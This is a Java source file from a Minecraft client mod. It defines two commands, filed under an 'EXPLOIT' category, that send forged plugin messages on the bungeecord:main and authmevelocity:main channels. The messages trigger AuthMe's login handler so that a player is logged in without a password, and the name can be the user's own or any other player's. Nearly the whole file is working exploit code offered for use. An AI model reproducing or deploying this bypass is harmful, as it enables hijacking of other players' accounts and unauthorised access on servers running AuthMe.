package dev.atlasclient.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import dev.atlasclient.Helper;
import dev.atlasclient.command.Command;
import dev.atlasclient.command.CommandManager;

/**
 * AuthMe (Bungee) bypass — sends a Plugin Message on bungeecord:main using Java writeUTF framing.
 * Triggers AuthMe BungeeReceiver.performLogin when the server has:
 *  - spigot.yml -> settings.bungeecord: true
 *  - AuthMe -> HooksSettings.BungeeCord: true
 *
 * Usage:
 *   /authmebungee           -> targets your current name
 *   /authmebungee <name>    -> targets a specific exact name
 */
public class AuthMeBungeeBypassCommand extends Command {
    /**
     * Constructor for the AuthMe Bungee bypass command.
     * Sets up the command name and description.
     */
    public AuthMeBungeeBypassCommand() {
        super("authmebungee", "Bypasses AuthMe via BungeeCord plugin message", CommandManager.CommandCategory.EXPLOIT);
    }

    /**
     * Builds the command structure using Brigadier command builder.
     * Creates two execution paths:
     * 1. No arguments - uses current player's name
     * 2. With target name argument - uses specified name
     */
    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root
            // Execute without arguments - uses current player's name
            .executes(ctx -> {
                // Get the current player's game profile name
                String self = MinecraftClient.getInstance().getGameProfile().getName();
                // Send the plugin message with current player's name
                send(self);
                // Print success message to chat
                Helper.printChatMessage("[AuthMe-Bungee] Payload sent for: " + self);
                return SINGLE_SUCCESS;
            })
            // Add argument for specifying target name
            .then(com.mojang.brigadier.builder.RequiredArgumentBuilder
                    .<CommandSource, String>argument("target", StringArgumentType.word()) // Define required string argument
                    .executes(ctx -> {
                        // Get the target name from the command arguments
                        String target = StringArgumentType.getString(ctx, "target");
                        // Send the plugin message with target name
                        send(target);
                        // Print success message to chat with target name
                        Helper.printChatMessage("[AuthMe-Bungee] Payload sent for: " + target);
                        return SINGLE_SUCCESS;
                    })
            );
    }

    /**
     * Sends the AuthMe bypass plugin message to the server.
     * Uses bungeecord:main channel with AuthMe-specific packet format.
     * 
     * @param exactName The exact player name to send in the bypass payload
     */
    private void send(String exactName) {
        // Send plugin message through Helper utility
        // Channel: bungeecord:main
        Helper.sendPluginMessage("bungeecord:main", out -> {
            // MUST use writeUTF framing (Java modified-UTF) to match server-side DataInput.readUTF
            out.writeUTF("AuthMe.v2");          // subChannel - identifies the AuthMe protocol version
            out.writeUTF("perform.login");      // typeId - specifies the login action to perform
            out.writeUTF(exactName);            // player name - the target player for the login
        });
    }
}

/**
 * AuthMeVelocity bypass — if a server runs an AuthMe-velocity bridge on channel authmevelocity:main
 * that accepts LOGIN,<name> (implementation-dependent). Keep if you specifically target that plugin.
 *
 * Usage:
 *   /authmevelocitybypass
 */
class AuthMeVelocityBypassCommand extends Command {
    /**
     * Constructor for the AuthMe Velocity bypass command.
     * Sets up the command name and description for Velocity-based AuthMe bypass.
     */
    public AuthMeVelocityBypassCommand() {
        super("authmevelocitybypass", "Bypasses AuthMeVelocity (if their bridge is active)", CommandManager.CommandCategory.EXPLOIT);
    }

    /**
     * Builds the simple command structure for Velocity bypass.
     * Only supports execution without arguments - uses current player's name.
     */
    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        // Simple command that only executes without arguments
        root.executes(context -> {
            // Get current player's name from game profile
            String name = MinecraftClient.getInstance().getGameProfile().getName();
            // Send Velocity-specific plugin message
            Helper.sendPluginMessage("authmevelocity:main", out -> {
                // Keep writeUTF framing as well; adjust strings if the target expects different opcodes
                out.writeUTF("LOGIN");          // Command opcode for login action
                out.writeUTF(name);             // Player name to perform login for
            });
            // Print success confirmation to chat
            Helper.printChatMessage("[AuthMe-Velocity] Payload packet sent!");
            return SINGLE_SUCCESS;
        });
    }
}
